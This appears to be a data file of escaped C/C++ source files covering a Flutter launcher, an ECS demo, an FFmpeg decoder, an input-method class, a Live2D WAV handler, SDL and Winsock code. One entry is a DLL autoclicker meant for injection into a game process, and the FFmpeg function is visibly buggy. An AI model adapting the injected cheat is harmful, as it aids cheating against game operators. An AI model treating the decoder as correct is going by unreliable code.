cout << \"Aww :( It's okay, we can play again!\" << endl;\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hackathonfront\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"glad/gl.h\"\n#include \"GLFW/glfw3.h\"\n#include \"Silverback.hpp\"\n\nstruct Position \n{\n    Position() {}\n    Position(float x, float y) : x{x}, y{y} {}\n    float x;\n    float y;\n};\n\nstruct Velocity \n{\n    Velocity() {}\n    Velocity(float x, float y) : x{x}, y{y} {}\n    float x;\n    float y;\n};\n\nstruct Material\n{\n    Material() {}\n    Material(const char* tex) : texture{tex} {}\n    const char* texture = \"\";\n};\n\nstatic GLFWwindow* sWindow = nullptr;\n\nstatic void InitContext();\n\nstatic void WindowKeyCallback(GLFWwindow* window, int key, int mods, int scancode, int action);\n\nint main(int argc, char** argv) \n{\n    // Glad and GLFW context creation.\n    InitContext();\n\n    // In order to use the Silverback ECS, we need to initialize a Registry\n    // instance, which will act as a mediator between us and the underlying logic. \n    // Entties, components and systems will be created from this registry instance.\n    slv::Registry registry;\n\n    // Create some entities.\n    //\n    auto player = registry.CreateEntity();\n    auto enemy = registry.CreateEntity();\n\n    // Add some components. Note that the templates here can quite literally\n    // be any object that you come up with, so long as the provided arguments\n    // can be used to construct them.\n    //\n    player->Add<Position>(5.0f, 3.0f);\n    player->Add<Velocity>(9.0f, 9.0f);  \n    player->Add<Material>(\"Test1.png\");\n\n    enemy->Add<Position>(8.0f, 6.0f);\n    enemy->Add<Velocity>(10.0f, 15.0f);\n    enemy->Add<Material>(\"Test2.png\");\n\n    // Create some systems. The parameter defines which \"layer\" the system\n    // resides in, which will be set to 0 if it's not specified here.\n    // The layer construct is a simple a way to ensure that any given system(s)\n    // will be run after/before any other system(s).\n    //\n    auto system1 = registry.CreateSystem<Position>(1);\n    auto system2 = registry.CreateSystem<Velocity>(1);\n    auto system3 = registry.CreateSystem<Material>(1);\n\n    // Define a function that will be called by registry.RunSystems().\n    //\n    system1->Action([](const float ts, const std::vector<slv::EntityID>& entities, Position* p) \n    {\n        for(int i = 0; i < entities.size(); i++) \n        {\n            std::cout << p[i].x << std::endl;\n            std::cout << p[i].y << std::endl;\n        }\n    });\n\n    system2->Action([](const float ts, const std::vector<slv::EntityID>& entities, Velocity* v) \n    {\n        for(int i = 0; i < entities.size(); i++) \n        {\n            std::cout << v[i].x << std::endl;\n            std::cout << v[i].y << std::endl;\n        }\n    });\n\n    system3->Action([](const float ts, const std::vector<slv::EntityID>& entities, Material* mat) \n    {\n        for(int i = 0; i < entities.size(); i++) \n        {\n            std::cout << mat[i].texture << std::endl;\n        }\n    }); \n\n\n    // Finally we run each system, which is when the previously defined \"Actions\" will\n    // be called. This is where the aforementioned \"layer\" construct comes in handy,\n    // since we can specfically only run the systems that belong to a specific layer.\n    registry.RunSystems(1, 1);\n\n\n    while(!glfwWindowShouldClose(sWindow)) \n    {\n        glClear(GL_COLOR_BUFFER_BIT);\n        glClearColor(0.1f, 0.1f, 0.1f, 1.0f);\n\n        glfwPollEvents();\n        glfwSwapBuffers(sWindow);\n    }\n}\n\n\nvoid InitContext() \n{\n    glfwInit();\n\n\tglfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n\tglfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n\tglfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n\tglfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n    sWindow = glfwCreateWindow(800, 600, \"window\", NULL, NULL);\n    glfwMakeContextCurrent(sWindow);\n\n    glfwSetKeyCallback(sWindow, WindowKeyCallback);\n\n\tgladLoadGL(glfwGetProcAddress);\n}\n\n\nvoid WindowKeyCallback(GLFWwindow* window, int key, int mods, int scancode, int action) \n{\n    if(key == GLFW_KEY_ESCAPE) \n    {\n        glfwSetWindowShouldClose(sWindow, true);\n    }\n}\n\n\n",
    "extern \"C\"{\n#include <libavcodec/avcodec.h>\n#include <libavformat/avformat.h>\n#include <libswscale/swscale.h>\n#include <stdio.h>\n#include <inttypes.h>\n}\n\nbool a_error_msg(const char *msg){printf(\"%s\\n\", msg); return false;}\nbool audio_frame(const char* filename, int* awidth, int* aheight, unsigned char **adata){\n    AVFormatContext *av_format_ctx = avformat_alloc_context();\n    if(!av_format_ctx) a_error_msg(\"cannot initialize avformat\");\n    if(avformat_open_input(&av_format_ctx,filename, nullptr, nullptr) < 0)\n        a_error_msg(\"cannot open audiofile data\");\n    int audio_stream_index = -1;\n    AVCodecParameters* av_codec_par;\n    const AVCodec* av_codec;\n    for(int asx = 0; asx < av_format_ctx->nb_streams; asx++){\n        auto streams = av_format_ctx->streams[asx];\n        av_codec_par = streams->codecpar;\n        av_codec = avcodec_find_decoder(av_codec_par->codec_id);\n        if(!av_codec) continue;\n        if(av_codec_par->codec_type == AVMEDIA_TYPE_AUDIO)\n            audio_stream_index = asx; break;\n    }\n    if(audio_stream_index == -1) a_error_msg(\"could not find audio stream\");\n    AVCodecContext* av_codec_context = avcodec_alloc_context3(av_codec);\n    if(!av_codec_context) a_error_msg(\"cannot initialize av_codec context\");\n    if(avcodec_parameters_to_context(av_codec_context, av_codec_par) < 0)\n        a_error_msg(\"cannot parameterise context\");\n    if(avcodec_open2(av_codec_context, av_codec, nullptr) < 0)\n        a_error_msg(\"cannot open av_codec file\");\n    \n    int response;\n    AVFrame* av_frame = av_frame_alloc();\n    if(!av_frame) a_error_msg(\"cannot initialize av_frame\");\n    AVPacket* av_packet = av_packet_alloc();\n    if(!av_packet) a_error_msg(\"cannot initialize av_packet\");\n    while(av_read_frame(av_format_ctx, av_packet) >= 0){\n        if(av_packet->stream_index != audio_stream_index) continue;\n        response = avcodec_send_packet(av_codec_context, av_packet);\n        if(response < 0) a_error_msg(av_err2str(response));\n        response = avcodec_receive_frame(av_codec_context, av_frame);\n        if(response == AVERROR(EAGAIN) || response == AVERROR_EOF) continue;\n        else if(response < 0) a_error_msg(av_err2str(response));\n        av_packet_unref(av_packet);\n        break;\n    }\n    \n    uint8_t* data = new uint8_t [av_frame->width * av_frame->height * 4];\n    SwsContext* sws_scale_ctx = sws_getContext(av_frame->width, av_frame->height, av_codec_context->pix_fmt, av_frame->width, av_frame->height, AV_PIX_FMT_RGB0, SWS_BILINEAR, nullptr, nullptr, nullptr);\n    if(!sws_scale_ctx) delete[] data; a_error_msg(\"failed to set sws scale\");\n    uint8_t* dest[4] = {data, nullptr, nullptr, nullptr};\n    int dest_lines[4] = {av_frame->width * 4, 0, 0, 0};\n    sws_scale(sws_scale_ctx, av_frame->data, av_frame->linesize, 0, av_frame->height, dest, dest_lines);\n    sws_freeContext(sws_scale_ctx);\n    \n    *awidth = av_frame->width;\n    *aheight = av_frame->height;\n    *adata = data;\n    \n    avformat_close_input(&av_format_ctx);\n    av_frame_free(&av_frame);\n    av_packet_free(&av_packet);\n    avformat_free_context(av_format_ctx);\n    avcodec_free_context(&av_codec_context);\n}\n",
    "#include \"Windows.h\"\r\n#include \"source/me/sleepyfish/autoclicker/Utils.h\"\r\n#include \"source/me/sleepyfish/autoclicker/ClickUtils.h\"\r\n\r\nClickUtils* rightClickUtils{};\r\nClickUtils* leftClickUtils{};\r\n\r\nbool running = false;\r\n\r\nvoid Init(HMODULE mod) {\r\n\r\n    // initialize click utils for left and right clicks\r\n    {\r\n        rightClickUtils = new ClickUtils(1);\r\n        leftClickUtils = new ClickUtils(0);\r\n\r\n        rightClickUtils->init();\r\n        leftClickUtils->init();\r\n    }\r\n\r\n    // print that the dll is injected if console mode is enabled\r\n    Utils::messageBox(std::string(\"AutoClicker Injected\\n\\n\\nHold Left -> Left AutoClick\\nHold Right -> Right AutoClick\\n\"\r\n        \"\\nHold backspace to Detach\\n\\n\\nInjected into: \" + Utils::getCurrentProcessPathName()).c_str());\r\n\r\n    running = true;\r\n\r\n    // main loop\r\n    while (running) {\r\n\r\n        // check if ingame focus\r\n        if (Utils::hasIngameFocus()) {\r\n\r\n            // update click utils if ur holding right mouse button down\r\n            if (Utils::holdingMouseRight())\r\n                rightClickUtils->update(15, 18);\r\n\r\n            // update click utils if ur holding left mouse button down\r\n            if (Utils::holdingMouseLeft())\r\n                leftClickUtils->update(10, 14);\r\n\r\n            // exit the whole main loop if ur holding backspace\r\n            if (GetAsyncKeyState(VK_BACK) & 0x8000) {\r\n                running = false;\r\n                continue;\r\n            }\r\n        }\r\n\r\n        // sleep for 0.20 seconds\r\n        Sleep(20L);\r\n    }\r\n\r\n    Utils::messageBox(\"AutoClicker Detached\");\r\n\r\n    // free click utils for memory management\r\n    delete rightClickUtils;\r\n    delete leftClickUtils;\r\n\r\n    // free the dll / like detaching\r\n    FreeLibrary(mod);\r\n}\r\n\r\nBOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved) {\r\n\r\n    // checks if the dll action is attach\r\n    if (dwReason == DLL_PROCESS_ATTACH) {\r\n        DisableThreadLibraryCalls(hModule);\r\n\r\n        // create thread for the main loop passing argument hModule to the init function\r\n        HANDLE hThread = CreateThread (\r\n    nullptr, 0, (LPTHREAD_START_ROUTINE) (Init), hModule, 0, nullptr\r\n        );\r\n\r\n        // close the thread\r\n        if (hThread != nullptr)\r\n            CloseHandle(hThread);\r\n    }\r\n\r\n    return true;\r\n}",
    "#include \"hazkey_preedit.h\"\n\n#include \"hazkey_candidate.h\"\n#include \"hazkey_state.h\"\n\nnamespace fcitx {\n\nconstexpr int NormalCandidateListNBest = 18;\nconstexpr int PredictCandidateListNBest = 4;\n\nstd::string HazkeyPreedit::text() const {\n    if (ic_->capabilityFlags().test(CapabilityFlag::Preedit)) {\n        return ic_->inputPanel().clientPreedit().toString();\n    } else {\n        return ic_->inputPanel().preedit().toString();\n    }\n}\n\nvoid HazkeyPreedit::setPreedit(Text text) {\n    if (ic_->capabilityFlags().test(CapabilityFlag::Preedit)) {\n        ic_->inputPanel().setClientPreedit(text);\n    } else {\n        ic_->inputPanel().setPreedit(text);\n    }\n}\n\nvoid HazkeyPreedit::setSimplePreedit(const std::string &text) {\n    std::vector<std::string> texts = {text};\n    setMultiSegmentPreedit(texts, 0);\n}\n\nvoid HazkeyPreedit::setMultiSegmentPreedit(std::vector<std::string> &texts,\n                                           int cursorSegment = 0) {\n    auto preedit = Text();\n    for (int i = 0; size_t(i) < texts.size(); i++) {\n        if (i < cursorSegment) {\n            preedit.append(texts[i], TextFormatFlag::NoFlag);\n        } else if (i == cursorSegment) {\n            preedit.setCursor(preedit.textLength());\n            preedit.append(texts[i], TextFormatFlag::HighLight);\n            continue;\n        } else {\n            preedit.append(texts[i], TextFormatFlag::Underline);\n        }\n    }\n    setPreedit(preedit);\n}\n\nvoid HazkeyPreedit::commitPreedit() {\n    if (ic_->capabilityFlags().test(CapabilityFlag::Preedit)) {\n        ic_->commitString(\n            ic_->inputPanel().clientPreedit().toStringForCommit());\n    } else {\n        ic_->commitString(ic_->inputPanel().preedit().toStringForCommit());\n    }\n}\n\n}  // namespace fcitx\n",
    "\ufeff/**\n * Copyright(c) Live2D Inc. All rights reserved.\n *\n * Use of this source code is governed by the Live2D Open Software license\n * that can be found at https://www.live2d.com/eula/live2d-open-software-license-agreement_en.html.\n */\n\n#include \"LAppWavFileHandler.hpp\"\n#include <cmath>\n#include <cstdint>\n#include \"LAppPal.hpp\"\n\nLAppWavFileHandler::LAppWavFileHandler()\n    : _rawData(NULL)\n    , _pcmData(NULL)\n    , _userTimeSeconds(0.0f)\n    , _lastRms(0.0f)\n    , _sampleOffset(0)\n{\n}\n\nLAppWavFileHandler::~LAppWavFileHandler()\n{\n    if (_rawData != NULL)\n    {\n        CSM_FREE(_rawData);\n    }\n\n    if (_pcmData != NULL)\n    {\n        ReleasePcmData();\n    }\n}\n\nCsm::csmBool LAppWavFileHandler::Update(Csm::csmFloat32 deltaTimeSeconds)\n{\n    Csm::csmUint32 goalOffset;\n    Csm::csmFloat32 rms;\n\n    // \u30c7\u30fc\u30bf\u30ed\u30fc\u30c9\u524d/\u30d5\u30a1\u30a4\u30eb\u672b\u5c3e\u306b\u9054\u3057\u305f\u5834\u5408\u306f\u66f4\u65b0\u3057\u306a\u3044\n    if ((_pcmData == NULL)\n        || (_sampleOffset >= _wavFileInfo._samplesPerChannel))\n    {\n        _lastRms = 0.0f;\n        return false;\n    }\n\n    // \u7d4c\u904e\u6642\u9593\u5f8c\u306e\u72b6\u614b\u3092\u4fdd\u6301\n    _userTimeSeconds += deltaTimeSeconds;\n    goalOffset = static_cast<Csm::csmUint32>(_userTimeSeconds * _wavFileInfo._samplingRate);\n    if (goalOffset > _wavFileInfo._samplesPerChannel)\n    {\n        goalOffset = _wavFileInfo._samplesPerChannel;\n    }\n\n    // RMS\u8a08\u6e2c\n    rms = 0.0f;\n    for (Csm::csmUint32 channelCount = 0; channelCount < _wavFileInfo._numberOfChannels; channelCount++)\n    {\n        for (Csm::csmUint32 sampleCount = _sampleOffset; sampleCount < goalOffset; sampleCount++)\n        {\n            Csm::csmFloat32 pcm = _pcmData[channelCount][sampleCount];\n            rms += pcm * pcm;\n        }\n    }\n    rms = sqrt(rms / (_wavFileInfo._numberOfChannels * (goalOffset - _sampleOffset)));\n\n    _lastRms = rms;\n    _sampleOffset = goalOffset;\n    return true;\n}\n\nvoid LAppWavFileHandler::Start(const Csm::csmString& filePath)\n{\n    // WAV\u30d5\u30a1\u30a4\u30eb\u306e\u30ed\u30fc\u30c9\n    if (!LoadWavFile(filePath))\n    {\n        return;\n    }\n\n    // \u30b5\u30f3\u30d7\u30eb\u53c2\u7167\u4f4d\u7f6e\u3092\u521d\u671f\u5316\n    _sampleOffset = 0;\n    _userTimeSeconds = 0.0f;\n\n    // RMS\u5024\u3092\u30ea\u30bb\u30c3\u30c8\n    _lastRms = 0.0f;\n}\n\nCsm::csmFloat32 LAppWavFileHandler::GetRms() const\n{\n    return _lastRms;\n}\n\nconst LAppWavFileHandler::WavFileInfo& LAppWavFileHandler::GetWavFileInfo() const\n{\n    return _wavFileInfo;\n}\n\nconst Csm::csmByte* LAppWavFileHandler::GetRawData() const\n{\n    return _rawData;\n}\n\nCsm::csmUint64 LAppWavFileHandler::GetRawDataSize() const\n{\n    return _rawDataSize;\n}\n\nCsm::csmVector<Csm::csmFloat32> LAppWavFileHandler::GetPcmData() const\n{\n    Csm::csmVector<Csm::csmFloat32> buffer;\n\n    for (Csm::csmUint32 sampleCount = 0; sampleCount < _wavFileInfo._samplesPerChannel; sampleCount++)\n    {\n        for (Csm::csmUint32 channelCount = 0; channelCount < _wavFileInfo._numberOfChannels; channelCount++)\n        {\n            buffer.PushBack(_pcmData[channelCount][sampleCount]);\n        }\n    }\n\n    return buffer;\n}\n\nvoid LAppWavFileHandler::GetPcmDataChannel(Csm::csmFloat32* dst, Csm::csmUint32 useChannel) const\n{\n    for (Csm::csmUint32 sampleCount = 0; sampleCount < _wavFileInfo._samplesPerChannel; sampleCount++)\n    {\n        dst[sampleCount] = _pcmData[useChannel][sampleCount];\n    }\n}\n\nCsm::csmFloat32 LAppWavFileHandler::NormalizePcmSample(Csm::csmUint32 bitsPerSample, Csm::csmByte* data, Csm::csmUint32 dataSize)\n{\n    Csm::csmInt32 pcm32;\n\n    // 32\u30d3\u30c3\u30c8\u5e45\u306b\u62e1\u5f35\u3057\u3066\u304b\u3089-1\uff5e1\u306e\u7bc4\u56f2\u306b\u4e38\u3081\u308b\n    switch (bitsPerSample)\n    {\n    case 8:\n        if (1 <= dataSize)\n        {\n            const Csm::csmUint8 ret = data[0];\n            pcm32 = static_cast<Csm::csmInt32>(ret) - 128;\n            pcm32 <<= 24;\n        }\n        else\n        {\n            pcm32 = 0;\n        }\n        break;\n    case 16:\n        if (2 <= dataSize)\n        {\n            const Csm::csmUint16 ret = (data[1] << 8) | data[0];\n            pcm32 = ret << 16;\n        }\n        else\n        {\n            pcm32 = 0;\n        }\n        break;\n    case 24:\n        if (3 <= dataSize)\n        {\n            const Csm::csmUint32 ret = (data[2] << 16) | (data[1] << 8) | data[0];\n            pcm32 = ret << 8;\n        }\n        else\n        {\n            pcm32 = 0;\n        }\n        break;\n    case 32:\n        if (4 <= dataSize)\n        {\n            const Csm::csmUint32 ret = (data[3] << 24) | (data[2] << 16) | (data[1] << 8) | data[0];\n            pcm32 = ret << 0;\n        }\n        else\n        {\n            pcm32 = 0;\n        }\n        break;\n    default:\n        // \u5bfe\u5fdc\u3057\u3066\u3044\u306a\u3044\u30d3\u30c3\u30c8\u5e45\n        pcm32 = 0;\n        break;\n    }\n\n    return static_cast<Csm::csmFloat32>(pcm32) / INT32_MAX;\n}\n\nCsm::csmBool LAppWavFileHandler::LoadWavFile(const Csm::csmString& filePath)\n{\n    Csm::csmBool ret;\n\n    // \u65e2\u306bwav\u30d5\u30a1\u30a4\u30eb\u30ed\u30fc\u30c9\u6e08\u307f\u306a\u3089\u3070\u9818\u57df\u958b\u653e\n    if (_rawData != NULL)\n    {\n        CSM_FREE(_rawData);\n        _rawDataSize = 0;\n    }\n    if (_pcmData != NULL)\n    {\n        ReleasePcmData();\n    }\n\n    // \u30d5\u30a1\u30a4\u30eb\u30ed\u30fc\u30c9\n    _byteReader._fileByte = LAppPal::LoadFileAsBytes(filePath.GetRawString(), &(_byteReader._fileSize));\n    _byteReader._readOffset = 0;\n\n    // \u30d5\u30a1\u30a4\u30eb\u30ed\u30fc\u30c9\u306b\u5931\u6557\u3057\u3066\u3044\u308b\u304b\u3001\u5148\u982d\u306e\u30b7\u30b0\u30cd\u30c1\u30e3\"RIFF\"\u3092\u5165\u308c\u308b\u30b5\u30a4\u30ba\u3082\u306a\u3044\u5834\u5408\u306f\u5931\u6557\n    if (",
    "#include <iostream>\n#include \"gui_widget/sdl_impl/sdl_progress_bar.h\"\n\nusing namespace std;\n\nSdlProgBar::SdlProgBar(char *name,\n                       kiss_window* win,\n                       SDL_Renderer *renderer):ProgBar(name) {\n    m_pWindow = win;\n    m_pRenderer = renderer;\n    m_dirty = true;\n    m_state = PLAYBACK_PLAY;\n    kiss_progressbar_new(&m_bar, win, win->rect.x, win->rect.y + kiss_screen_height - 20, kiss_screen_width);\n    m_rect.x = m_bar.rect.x;\n    m_rect.y = m_bar.rect.y;\n    m_rect.w = m_bar.rect.w;\n    m_rect.h = m_bar.rect.h;\n    kiss_label_new(&m_timeLabel,win, (char*)\"0:0:0\", win->rect.x, win->rect.y + win->rect.h - 18);\n    kiss_label_new(&m_durLabel, win, (char*)\"0:0:0\", win->rect.w - 50, win->rect.h - 18);\n}\n        \nbool SdlProgBar::is_dirty() {\n    return m_dirty;\n}\n\nvoid SdlProgBar::set_duration(long long duration) {\n    m_duration = duration;\n    int hour = m_duration / 3600;\n    int min  = (m_duration % 3600) / 60;\n    int sec  = (m_duration % 3600) % 60;\n    char buf[10];\n    snprintf(buf,10,\"%d:%d:%d\",hour, min, sec);\n    kiss_string_copy(m_durLabel.text, KISS_MAX_LABEL, buf, NULL);\n    m_bar.step = (1/(float)m_duration);\n    cout << \"bar step:\" << m_bar.step << endl;\n    m_bar.run = 1;\n}\n\nvoid SdlProgBar::set_current_time(long long current) {\n    char buf[10];\n    if (current <= 0) {\n        return;\n    }\n    m_currentTime = current;\n    int hour = m_currentTime/ 3600;\n    int min  = (m_currentTime % 3600) / 60;\n    int sec  = (m_currentTime % 3600) % 60;\n    snprintf(buf,10,\"%d:%d:%d\",hour, min, sec);\n    kiss_string_copy(m_timeLabel.text, KISS_MAX_LABEL, buf, NULL);\n    m_bar.fraction = m_currentTime /(float)m_duration + 0.01;\n}\n\nint SdlProgBar::draw() {\n    kiss_progressbar_draw(&m_bar, m_pRenderer);\n    kiss_label_draw(&m_timeLabel, m_pRenderer);\n    kiss_label_draw(&m_durLabel, m_pRenderer);\n    return 0;\n}\n\nint SdlProgBar::get_type() {\n    return 0;\n}\n\nint SdlProgBar::event_handler(void *event) {\n    SDL_Event *e = (SDL_Event *)event;\n    if (e->type == SDL_MOUSEBUTTONDOWN) {\n        // check if mouse down point is outside of progress bar, then play or pause\n        if (!kiss_pointinrect(e->button.x, e->button.y,&m_rect)) {\n            if (m_state == PLAYBACK_PLAY) {\n                m_state = PLAYBACK_PAUSE;\n            } else if (m_state == PLAYBACK_PAUSE) {\n                m_state = PLAYBACK_PLAY;\n            }\n        } else {\n            m_seekTime = (e->button.x / (float)m_pWindow->rect.w) * m_duration;\n            set_current_time(m_seekTime);\n            m_state = PLAYBACK_SEEK;\n            cout << \"check seek state\" << endl;\n        }\n        m_dirty = true;\n        if (m_actionCB) {\n            action a;\n            a.state = m_state;\n            a.seek_time = m_seekTime;\n            m_actionCB(m_userdata, &a);\n        }\n        return 1;\n    }\n    return 0;\n}\n\nint SdlProgBar::set_event_resp_area(int x, int y, int w, int h) {\n    return 0;\n}\n\nvoid *SdlProgBar::get_window() {\n    return m_pWindow;\n}\n\nvoid *SdlProgBar::get_renderer() {\n    return m_pRenderer;\n}\n\n",
    "#include \"item.h\"\n\n#include <iostream>\n#include <vector>\n#include <fstream>\n#include <string>\n#include <cstring>\n\nusing namespace std;\n\n/* Staattisen luokkamuuttujan m\u00e4\u00e4rittely. Muuttujan arvoa kasvatetaan\n* luokan rakentajissa, mink\u00e4 ansiosta muuttujassa on tallessa arvo, joka\n* kertoo luokasta luotujen instanssien m\u00e4\u00e4r\u00e4n.\n*/\nsize_t Item::count = 0;\n\n\n/* Oletusrakentaja, jossa asetetaan j\u00e4senmuuttujille oletusarvot ja\n* p\u00e4ivitet\u00e4\u00e4n staattisen luokkamuuttujan lukema. Lukema p\u00e4ivitet\u00e4\u00e4n heti\n* rakentajan alussa, koska ajantasaista lukemaa tarvitaan\n* generateId-metodissa.\n*/\nItem::Item()\n{\n    count++;\n    this->id = generateId();\n    this->name = \"ei nime\u00e4\";\n    this->category = \"muu\";\n    this->isRented = false;\n}\n\n\n/* Kuormitettu rakentaja, jossa p\u00e4ivitet\u00e4\u00e4n staattisen luokkamuuttujan\n* lukema ja generoidaan instanssille tunnus. Muiden j\u00e4senmuuttujien arvoiksi\n* asetetaan parametrien v\u00e4lityksell\u00e4 saatavat arvot. category-j\u00e4senmuuttujan\n* kohdalla k\u00e4ytet\u00e4\u00e4n switch-case-rakennetta, jonka ehtoihin verraten\n* category-parametrina saadun kokonaisluvun perusteella asetetaan arvo luokan\n* category-j\u00e4senmuuttujalle.\n*/\nItem::Item(string name, int category, bool isRented)\n{\n    count++;\n    this->id = generateId();\n    this->name = name;\n\n    switch (category)\n    {\n    case 1:\n        this->category = \"sukset\";\n        break;\n\n    case 2:\n        this->category = \"sauvat\";\n        break;\n\n    case 3:\n        this->category = \"monot\";\n        break;\n\n    default:\n        this->category = \"muu\";\n        break;\n    }\n\n    this->isRented = isRented;\n}\n\n\n// Tuhoaja:\nItem::~Item() {}\n\n\n/* Luokan privaatti j\u00e4senmetodi, joka luo tunnuksen. Funktiossa on useita\n* apumuuttujia, joista row- ja rows-muuttujia hy\u00f6dynnet\u00e4\u00e4n tiedoston\n* lukemisessa. size_t-tietotyyppi\u00e4 oleva newId-apumuuttuja alustetaan\n* arvoon 0. size_t-tietotyyppi\u00e4 k\u00e4ytet\u00e4\u00e4n tietotyypin int-sijasta, koska\n* muualla koodissa hy\u00f6dynnet\u00e4\u00e4n vector<>-tietotyypin size-metodia, joka\n* palauttaa size_t-tietotyyppi\u00e4 olevan luvun.\n*\n* itemsFileForReading-apumuuttujaan talletetaan ifstream-luokan instanssi,\n* jota kuormitetaan luettavan tiedoston nimell\u00e4 eli\n* items_file.txt-merkkijonolla. Jos tiedosto on olemassa eli\n* itemsFileForReading-muuttujassa olevan instanssin good-j\u00e4senmetodin kutsu\n* palauttaa true-arvon, luetaan tiedoston sis\u00e4lt\u00f6 rows-muuttujaan siten, ett\u00e4\n* yksi rivi vastaa yht\u00e4 alkiota. Lopuksi kutsutaan\n* itemsFileForReading-muuttujaan talletetun instanssin close-metodia.\n*\n* Jos items_file.txt-tiedostoa ei ole olemassa, luodaan muualla ohjelmassa\n* t\u00e4m\u00e4 tiedosto ja lis\u00e4ksi kolme demotavaraa Item-alkioiseen taulukkoon.\n* Koska taulukko on j\u00e4senmuuttuja, ja se esitell\u00e4\u00e4n Items.h-tiedostossa\n* kolmipaikkaisena, luodaan t\u00e4st\u00e4 luokasta siis 3 + 3 eli kuusi instanssia.\n*\n* Jos instanssien lukum\u00e4\u00e4r\u00e4 t\u00e4st\u00e4 luokasta on kuusi tai v\u00e4hemm\u00e4n, ei tiedostoa\n* v\u00e4ltt\u00e4m\u00e4tt\u00e4 ole viel\u00e4 olemassa, mink\u00e4 vuoksi kolmelle demomieless\u00e4 tehdylle\n* instanssille generoituisi kesken\u00e4\u00e4n sama id, jos se luotaisiin else if\n* -haaran toteutusosan perusteella. Siksi if-lauseessa annetaan\n* newId-muuttujalle arvo luokasta tehtyjen instanssien lukum\u00e4\u00e4r\u00e4n perustella.\n*\n* Instanssien m\u00e4\u00e4r\u00e4st\u00e4 v\u00e4hennet\u00e4\u00e4n kolme, koska ohjelma luo Items-listan\n* alustuksessa kolme merkitykset\u00f6nt\u00e4 instanssia, joita ei tuoda n\u00e4kyviin\n* eik\u00e4 tallenneta tiedostoon. Niiden lukum\u00e4\u00e4r\u00e4\u00e4 ei haluta ottaa my\u00f6sk\u00e4\u00e4n\n* huomioon muille tavaroille tunnuksia generoitaessa. Siksi\n* newId-muuttujaan if-lauseessa asetetaan arvoksi count - 3.\n*\n* Jos ohjelma on esimerkiksi aloittanut ensimm\u00e4isen demoinstanssin luomisen,\n* on countin arvo nelj\u00e4. Silloin newId-muuttujaan tallennetaan arvo 4 - 3 eli\n* 1. N\u00e4in ensimm\u00e4inen demoinstanssi t\u00e4st\u00e4 luokasta saa tunnuksen 1. Kun\n* ohjelma etenee luomaan toista demoinstanssia, on countin arvo 5, ja\n* newId-muuttujan arvo siten 5 - 3 eli 2. N\u00e4in toisen demoinstanssin\n* tunnukseksi tulee 2.\n*\n* Jos ensimm\u00e4inen ehto ei t\u00e4yty ja siirryt\u00e4\u00e4n else if -haaraan ja jos siis\n* rows-muuttajassa olevien alkioiden lukum\u00e4\u00e4r\u00e4n jakoj\u00e4\u00e4nn\u00f6s nelj\u00e4n suhteen on\n* 0 eli rivien ollessa kirjoitettuna tiedostoon oikealla tavalla, iteroidaan\n* kaikki tavaroiden tunnuksia kuvaavat rivit l\u00e4pi.\n*\n* Jokaisella iteraatiolla apumuuttujaan idAsInt tallennetaan kulloisenkin\n* iteraatiokierroksen alkion kokonaisluvuksi muutettu arvo. Arvo muutetaan\n* kokonaisluvuksi string-kirjaston string to integer -metodia hy\u00f6dynt\u00e4m\u00e4ll\u00e4.\n* Sitten arvoa verrataan silmukan ulkopuolella aiemmin alustettuun\n* newId-muuttujan arvoon. Jos idAsInt-muuttujan arvo on suurempi, vaihdetaan\n* sen arvo newId-muuttujan arvoksi ja type castataan se samalla vastaamaan\n* size_t-tietotyyppi\u00e4. Suurimpaa tiedostosta l\u00f6ytyv\u00e4\u00e4 id:n arvoa kasvatetaan\n* lopuksi newId-muuttujaan tallennettuna yhdell\u00e4, ja n\u00e4in tavaralle saadaan\n* generoitua yksil\u00f6llinen id, joka ei ole sama muiden tiedostoissa olevien\n* tavaroiden tunnusten kanssa ja joka on aina edellisen tavaran tunnusta yht\u00e4\n* isompi.\n*\n* Jos else-haaraan p\u00e4\u00e4dyt\u00e4\u00e4n, tiedoston sis\u00e4lt\u00f6 on todenn\u00e4k\u00f6isesti\n* v\u00e4\u00e4r\u00e4nla",
    "// Original Author: Hayden Karp\n// I'm relatively unfamiliar with Winsock so I'm going to document some things to make sure I retain the info\n\n#define DEFAULT_PORT \"8080\"\n#define DEFAULT_BUFFER_LENGTH 9064\n#define LOG_RECEIVED_BYTES true\n\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n\n#include <iostream>\n#include <windows.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <iphlpapi.h>\n#include <vector>\n#include <sstream>\n\n#pragma comment(lib, \"Ws2_32.lib\")\n#pragma comment(lib, \"ws2_32\")\n\nusing namespace std;\n\nstring isolate_host_name (std::string str){\n    u_int64 f = str.find('\\n');\n    while (f != std::string::npos){\n        str.replace(f, 1, \" \");\n\n        f = str.find('\\n');\n    }\n\n    f = str.find('\\r');\n    while (f != std::string::npos){\n        str.replace(f, 1, \"\");\n\n        f = str.find('\\r');\n    }\n\n    std::string s;\n\n    